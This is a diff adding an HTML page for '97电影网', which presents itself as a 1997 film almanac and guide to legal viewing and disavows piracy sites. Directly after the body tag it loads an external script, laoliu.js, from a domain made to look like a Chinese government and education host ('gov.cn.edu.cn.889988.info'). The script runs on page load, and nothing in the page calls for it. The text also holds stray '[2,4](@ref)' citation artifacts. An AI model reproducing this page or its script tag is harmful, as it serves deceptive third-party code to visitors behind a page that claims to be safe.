@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>97电影网 - 1997电影年鉴·老片放映室·正版观影导航</title>
+<meta name="description" content="97电影网(97dianyingwang-h5.github.io)不是灰色资源站，而是1997年电影年鉴：97号放映室、年度片单、影史注脚、正版/公共领域观看入口。不托管视频、不聚合盗版源、不诱导下载。">
+<meta name="keywords" content="97电影网, 97dianyingwang-h5, 1997电影, 97号放映室, 老片年鉴, 正版观影, 公共领域电影">
+<meta name="author" content="97电影网">
+<meta name="robots" content="index, follow">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --ink:#1a120b;
+  --ink-2:#241810;
+  --paper:#f3e9d6;
+  --paper-2:#efe2c8;
+  --amber:#e0a93b;
+  --amber-deep:#b9791b;
+  --green:#2f5d4f;
+  --green-soft:#5c8a78;
+  --red:#9c3b2e;
+  --soft:#7c6a55;
+  --line:rgba(26,18,11,.18);
+  --card:rgba(243,233,214,.06);
+  --radius:18px;
+  --shadow:0 10px 28px rgba(0,0,0,.35);
+}
+html{scroll-behavior:smooth}
+body{font-family:"Noto Serif SC","Songti SC","PingFang SC",serif;background:var(--ink);color:var(--paper);line-height:1.85;overflow-x:hidden}
+.bg{position:fixed;inset:0;z-index:0;pointer-events:none;background:
+  radial-gradient(460px 360px at 85% 12%,rgba(224,169,59,.22),transparent 60%),
+  radial-gradient(520px 420px at 10% 90%,rgba(47,93,79,.26),transparent 60%),
+  linear-gradient(180deg,#1a120b,#241810 55%,#140d07 100%);}
+/* 放映机光柱 */
+.beam{position:fixed;top:-10%;right:6%;width:42vw;height:120vh;z-index:0;pointer-events:none;
+  background:linear-gradient(115deg,rgba(224,169,59,.16),transparent 55%);
+  transform:rotate(8deg);filter:blur(6px);animation:flick 5s ease-in-out infinite}
+@keyframes flick{0%,100%{opacity:.55}50%{opacity:.85}}
+/* 胶片齿孔 */
+.filmstrip{position:fixed;left:0;right:0;height:34px;z-index:0;pointer-events:none;opacity:.5;
+  background:repeating-linear-gradient(90deg,#000 0 10px,transparent 10px 22px);
+  -webkit-mask:linear-gradient(#000,#000);mask:linear-gradient(#000,#000)}
+.filmstrip.top{top:0}.filmstrip.bottom{bottom:0}
+
+.topbar{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(26,18,11,.86);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+.topbar-inner{max-width:1200px;margin:0 auto;padding:0 20px;height:60px;display:flex;align-items:center;justify-content:space-between}
+.brand{display:flex;align-items:center;gap:10px;font-weight:800;font-size:1.15rem}
+.brand .rm{width:34px;height:34px;border-radius:7px;background:linear-gradient(135deg,var(--amber),var(--amber-deep));color:#1a120b;display:flex;align-items:center;justify-content:center;font-weight:900;font-family:Georgia,serif}
+.brand b{color:var(--amber)}
+.topnav{display:flex;gap:4px}
+.topnav a{padding:8px 14px;border-radius:8px;font-size:.84rem;font-weight:600;color:var(--soft);transition:.25s}
+.topnav a:hover,.topnav a.active{background:rgba(224,169,59,.14);color:var(--amber)}
+.menu-btn{display:none;background:none;border:none;font-size:1.4rem;color:var(--amber);cursor:pointer}
+
+.hero{position:relative;z-index:1;margin-top:60px;padding:78px 20px 56px}
+.hero-inner{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:1.1fr .9fr;gap:40px;align-items:center}
+.kicker{font-family:"Courier New",monospace;font-size:.68rem;letter-spacing:3px;color:var(--amber);border:1px solid var(--line);padding:4px 10px;border-radius:20px}
+.hero h1{font-size:clamp(2rem,4.4vw,3.2rem);font-weight:900;line-height:1.16;margin:14px 0 8px}
+.hero h1 .y{color:var(--amber);text-shadow:0 8px 26px rgba(224,169,59,.3)}
+.hero h1 .g{color:var(--green-soft)}
+.hero p{color:#d8c7a8;font-size:1rem;margin:14px 0 24px}
+.hero-actions{display:flex;gap:14px;flex-wrap:wrap}
+.btn{font-family:inherit;font-weight:700;font-size:.9rem;padding:12px 24px;border-radius:10px;cursor:pointer;border:none;transition:.3s}
+.btn-main{background:linear-gradient(135deg,var(--amber),var(--amber-deep));color:#1a120b}
+.btn-main:hover{transform:translateY(-2px);box-shadow:0 14px 38px rgba(224,169,59,.35)}
+.btn-line{background:transparent;border:2px solid var(--green-soft);color:var(--green-soft)}
+.hero-card{background:var(--card);border:1px solid var(--line);border-radius:20px;padding:24px;box-shadow:var(--shadow)}
+.hero-card h3{font-size:.95rem;margin-bottom:10px;color:var(--amber)}
+.hero-card p{font-size:.78rem;color:#cdbb9c;line-height:1.65}
+.hero-card .ok{color:var(--green-soft);font-weight:800}
+
+.container{max-width:1200px;margin:0 auto;padding:52px 20px;position:relative;z-index:1}
+.label{font-family:"Courier New",monospace;font-size:.65rem;letter-spacing:3px;text-transform:uppercase;color:var(--amber)}
+.title{font-size:clamp(1.3rem,3vw,1.8rem);font-weight:800;margin:4px 0 6px}
+.desc{font-size:.88rem;color:#c9b89a;margin-bottom:30px}
+.divider{height:2px;background:repeating-linear-gradient(90deg,var(--amber) 0 14px,transparent 14px 26px);opacity:.25;margin:8px 0 26px}
+
+/* 97号放映室说明 */
+.note{background:rgba(224,169,59,.07);border:1px dashed var(--amber);border-radius:var(--radius);padding:24px;margin-bottom:34px}
+.note h3{font-size:1rem;color:var(--amber);margin-bottom:8px}
+.note p{font-size:.82rem;color:#cdbb9c;line-height:1.7}
+
+/* 1997 片单 */
+.year-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:20px}
+.film{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:22px;transition:.3s;position:relative;overflow:hidden}
+.film::before{content:"";position:absolute;left:0;top:0;bottom:0;width:5px;background:var(--c,var(--amber))}
+.film:hover{transform:translateY(-4px);box-shadow:var(--shadow);border-color:var(--c,var(--amber))}
+.film .yr{font-family:Georgia,serif;font-size:1.5rem;font-weight:900;color:var(--amber)}
+.film h3{font-size:1rem;color:#fff;margin:4px 0 4px}
+.film p{font-size:.76rem;color:#c9b89a;line-height:1.6}
+.film .tag{margin-top:10px;font-size:.7rem;font-weight:700;color:var(--c,var(--amber));display:inline-block}
+
+/* 影史注脚 */
+.fact-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:18px}
+.fact{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:20px}
+.fact h3{font-size:.95rem;color:#fff}
+.fact p{font-size:.76rem;color:#c9b89a;margin-top:6px}
+
+/* 正版入口 */
+.watch-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:18px}
+.w{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:20px}
+.w h3{font-size:.95rem;color:#fff}
+.w p{font-size:.76rem;color:#c9b89a;margin-top:6px}
+.w .tag{font-size:.7rem;color:var(--green-soft);font-weight:700;margin-top:8px;display:inline-block}
+
+.footer{position:relative;z-index:1;background:#0f0a05;color:var(--paper);padding:46px 20px 24px;margin-top:54px;border-top:1px solid var(--line)}
+.footer-inner{max-width:1200px;margin:0 auto}
+.footer-grid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:34px;margin-bottom:26px}
+.footer h4{font-size:.9rem;margin-bottom:10px;color:#fff}
+.footer a{display:block;font-size:.8rem;color:#bda982;padding:3px 0}
+.footer a:hover{color:var(--amber)}
+.footer p{font-size:.82rem;color:#bda982;line-height:1.6}
+.footer-bottom{text-align:center;font-size:.72rem;color:rgba(243,233,214,.5);padding-top:18px;border-top:1px solid rgba(243,233,214,.12)}
+.footer-bottom a{color:var(--amber);font-weight:600;display:inline}
+
+@media(max-width:1024px){.hero-inner{grid-template-columns:1fr}.hero-card{order:-1}}
+@media(max-width:768px){
+  .topnav{display:none;position:absolute;top:60px;left:0;right:0;flex-direction:column;background:rgba(26,18,11,.97);padding:12px 20px;border-bottom:1px solid var(--line)}
+  .topnav.open{display:flex}.menu-btn{display:block}
+  .footer-grid{grid-template-columns:1fr 1fr}
+}
+@media(max-width:480px){.footer-grid{grid-template-columns:1fr}.hero h1{font-size:1.7rem}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+<div class="bg"></div>
+<div class="beam"></div>
+<div class="filmstrip top"></div>
+<div class="filmstrip bottom"></div>
+
+<div class="topbar">
+  <div class="topbar-inner">
+    <div class="brand"><span class="rm">97</span>97<b>电影网</b></div>
+    <nav class="topnav" id="topNav">
+      <a href="#home" class="active">首页</a>
+      <a href="#room">97号放映室</a>
+      <a href="#year">1997片单</a>
+      <a href="#facts">影史注脚</a>
+      <a href="#watch">正版入口</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn">☰</button>
+  </div>
+</div>
+
+<section class="hero" id="home">
+  <div class="hero-inner">
+    <div>
+      <span class="kicker">ROOM 97 · THE 1997 FILM ALMANAC</span>
+      <h1>这里的“97”，<br>是<span class="y">1997 年</span>，不是<span class="g">灰色资源站</span>。</h1>
+      <p>97电影网（97dianyingwang-h5.github.io）是 97 号放映室：收 1997 年前后的电影、影史注脚与老片修复资料。不托管视频、不聚合盗版源、不弹“下载播放器”、不碰擦边入口。[2,4](@ref)</p>
+      <div class="hero-actions">
+        <button class="btn btn-main">🎞️ 进 97 号放映室</button>
+        <button class="btn btn-line">📽️ 看 1997 片单</button>
+      </div>
+    </div>
+    <div class="hero-card">
+      <h3>本店规矩</h3>
+      <p><span class="ok">✓</span> 名字带 97，内容是 1997 电影史<br>
+      <span class="ok">✓</span> 不深度链接非法视听节目<br>
+      <span class="ok">✓</span> 不诱导下载 APP / 播放器<br>
+      <span class="ok">✓</span> 老片优先走正版平台 / 公共领域档案<br>
+      <span class="ok">✓</span> 弹窗？没有。验证码？不要。</p>
+    </div>
+  </div>
+</section>
+
+<div class="container" id="room">
+  <div class="note">
+    <h3>为什么叫“97电影网”却不放全网盗版？</h3>
+    <p>网上“97视频 / 97电影”常被用作资源聚合马甲：弹窗、私服域名、诱导下载、擦边内容都可能出现。[2,4](@ref)  
+    我们这个 97 把数字“收编”成资料馆语言——97 号厅、1997 年、第 97 部胶片、97 分钟长镜。名字可以像，底色不能像。</p>
+  </div>
+
+  <div class="label">— ROOM 97 —</div>
+  <h2 class="title">97号放映室：像在老资料馆里坐下来</h2>
+  <p class="desc">栏目不是“最新热片”，而是“这一年发生了什么”。</p>
+  <div class="divider"></div>
+  <div class="fact-grid">
+    <div class="fact"><h3>年度海报墙</h3><p>1997 前后公映/获奖/修复的片子，按地区与流派排成一面墙。</p></div>
+    <div class="fact"><h3>97分钟长镜</h3><p>专门收单镜接近 97 分钟、或片长 97 分钟的作者片与实验片。</p></div>
+    <div class="fact"><h3>胶片注脚</h3><p>配色、字幕、拷贝、放映机、褪色颗粒——把“老”讲成审美。</p></div>
+    <div class="fact"><h3>修复日志</h3><p>4K 修复、声轨重混、档案出库记录，影迷比剧情更上头的部分。</p></div>
+  </div>
+</div>
+
+<div class="container" id="year">
+  <div class="label">— 1997 SELECTIONS —</div>
+  <h2 class="title">1997 片单：那一年的光</h2>
+  <p class="desc">以下为“1997 年前后”的示意片单，具体正版 availability 以平台当期授权为准。</p>
+  <div class="year-grid">
+    <div class="film" style="--c:var(--amber)"><div class="yr">1997</div><h3>《泰坦尼克号》</h3><p>远洋、阶级、琴声与下沉镜头。商业史诗的终点，也是录像带时代的巅峰。</p><div class="tag">史诗 / 爱情</div></div>
+    <div class="film" style="--c:var(--green-soft)"><div class="yr">1997</div><h3>《美丽人生》</h3><p>用笑话挡住集中营。喜剧外壳、悲剧内核，教科书级“不让观众先哭”的调度。</p><div class="tag">二战 / 寓言</div></div>
+    <div class="film" style="--c:var(--red)"><div class="yr">1997</div><h3>《猜火车》</h3><p>苏格兰边缘青年、蒙太奇狂想、厕所潜行。90 年代另类影像的开关。</p><div class="tag">反叛 / 作者片</div></div>
+    <div class="film" style="--c:var(--amber)"><div class="yr">1997</div><h3>《香港回归前后港片》</h3><p>97 前夜的江湖、赌片、僵尸、文艺同时回光。城市在变，拷贝先老。</p><div class="tag">港片 / 城市</div></div>
+    <div class="film" style="--c:var(--green-soft)"><div class="yr">1997</div><h3>《第五元素》</h3><p>吕克·贝松把歌剧、漫画、未来巴黎和橙色头发搅成一锅视听快餐。</p><div class="tag">科幻 / 设计感</div></div>
+    <div class="film" style="--c:var(--red)"><div class="yr">1997</div><h3>《春光乍泄》</h3><p>布宜诺斯艾利斯、瀑布、录音机。华语同志电影与王家卫美学的交界。</p><div class="tag">文艺 / 华语</div></div>
+  </div>
+</div>
+
+<div class="container" id="facts">
+  <div class="label">— 1997 FOOTNOTES —</div>
+  <h2 class="title">影史注脚：97 不只是年份</h2>
+  <p class="desc">做老片站，得懂一点电影史语境。</p>
+  <div class="fact-grid">
+    <div class="fact"><h3>DVD 还没统治</h3><p>1997 年录像带仍在退场，DVD 起步，盗版形态和今天完全不同。</p></div>
+    <div class="fact"><h3>CG 刚长大</h3><p>《泰坦尼克号》《第五元素》把数字合成往工业标准推了一截。</p></div>
+    <div class="fact"><h3>亚洲金融风暴</h3><p>资本紧了，港片产量与类型结构开始改写，江湖片慢慢退潮。</p></div>
+    <div class="fact"><h3>电影节版图</h3><p>戛纳/威尼斯/柏林、东京、釜山、金马——作者电影有了更多东方听众。</p></div>
+    <div class="fact"><h3>公共领域起点</h3><p>1921 年前影片多已公域；1997 的“老”，要和 1920s 的“更老”分开谈。</p></div>
+    <div class="fact"><h3>修复伦理</h3><p>补帧、上色、重剪都有争议。资料馆派会说：先保原貌，再谈好看。</p></div>
+  </div>
+</div>
+
+<div class="container" id="watch">
+  <div class="label">— LEGAL VIEWING —</div>
+  <h2 class="title">97号厅的正版入口</h2>
+  <p class="desc">老片不一定免费，但一定不该靠木马看。</p>
+  <div class="watch-grid">
+    <div class="w"><h3>正版订阅平台</h3><p>爱优腾芒 B 站的艺术片/经典区，部分 90 年代片有授权上架。</p><span class="tag">会员 / 租片</span></div>
+    <div class="w"><h3>1905 / 央视频</h3><p>官方正版国产老片、纪录片、主旋律精品，适合做“陪长辈看”片单。</p><span class="tag">官方免费</span></div>
+    <div class="w"><h3>公共领域档案</h3><p>Internet Archive / Prelinger：1920s 前默片、新闻片、教育片合法自由看。</p><span class="tag">无版权障碍</span></div>
+    <div class="w"><h3>资料馆 / 影展</h3><p>电影资料馆、北影节、上影节、高校放映：97 年修复版常在这里露面。</p><span class="tag">策展 / 限量</span></div>
+  </div>
+</div>
+
+<footer class="footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div>
+        <div class="brand"><span class="rm">97</span>97<b>电影网</b></div>
+        <p>97电影网（97dianyingwang-h5.github.io）是 1997 电影年鉴与 97 号放映室：老片、修复、影史注脚与正版观影导航。不提供未授权播放，不聚合非法视听节目，不诱导下载任何播放器。</p>
+      </div>
+      <div><h4>栏目</h4><a href="#room">97号放映室</a><a href="#year">1997片单</a><a href="#facts">影史注脚</a><a href="#watch">正版入口</a></div>
+      <div><h4>片种</h4><a href="#">90年代商业片</a><a href="#">港片回光</a><a href="#">作者电影</a><a href="#">公共领域默片</a></div>
+      <div><h4>说明</h4><a href="#">本站立场</a><a href="#">版权与引用</a><a href="#">隐私说明</a><a href="#">联系我们</a></div>
+    </div>
+    <div class="footer-bottom">
+      <p>© 1997–2024 97电影网 (Room 97 Film Almanac) - 1997电影年鉴 · 老片放映室 · 正版观影导航</p>
+      <p>网站地址：<a href="https://97dianyingwang-h5.github.io">https://97dianyingwang-h5.github.io</a></p>
+      <p style="margin-top:6px;opacity:.6">“97”指 1997 年与 97 号放映室，不涉及任何灰色影视资源站、盗版聚合或擦边内容。</p>
+    </div>
+  </div>
+</footer>
+
+<script>
+var menuBtn=document.getElementById('menuBtn'),topNav=document.getElementById('topNav');
+menuBtn.onclick=function(){topNav.classList.toggle('open')};
+topNav.querySelectorAll('a').forEach(function(a){a.onclick=function(){topNav.classList.remove('open')}});
+var secs=document.querySelectorAll('section[id],div[id]');
+addEventListener('scroll',function(){
+  var y=scrollY+80;
+  secs.forEach(function(s){
+    if(y>=s.offsetTop&&y<s.offsetTop+s.offsetHeight){
+      document.querySelectorAll('.topnav a').forEach(function(a){a.classList.remove('active')});
+      var l=document.querySelector('.topnav a[href="#'+s.id+'"]');
+      if(l)l.classList.add('active');
+    }
+  });
+});
+</script>
+</body>
+</html>
